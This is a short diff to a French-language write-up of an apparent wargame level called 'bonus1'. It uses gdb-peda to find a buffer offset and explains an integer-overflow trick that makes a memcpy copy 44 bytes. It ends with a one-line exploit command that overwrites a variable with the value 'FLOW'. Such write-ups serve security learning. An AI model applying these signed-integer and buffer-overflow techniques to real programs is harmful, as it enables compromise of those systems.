@@ -17,3 +17,9 @@ gdb-peda$ x $esp+0x3c
 gdb-peda$ pattern offset AA0AAFA
 AA0AAFA found at offset: <strong>40</strong>
 </pre>
+- Il faut donc ecrire 44 caractere dans memcpy se qui fait **101100** en binaire
+- Avec `<< 2` il faut que le int soit egale a **10000000000000000000000000001011** se qui fait -2147483637
+- Donc on peut executé la commande ci contre
+```
+./bonus1 -2147483637 $(python -c "print('A' * 40 +  '\x46\x4c\x4f\x57')")
+```
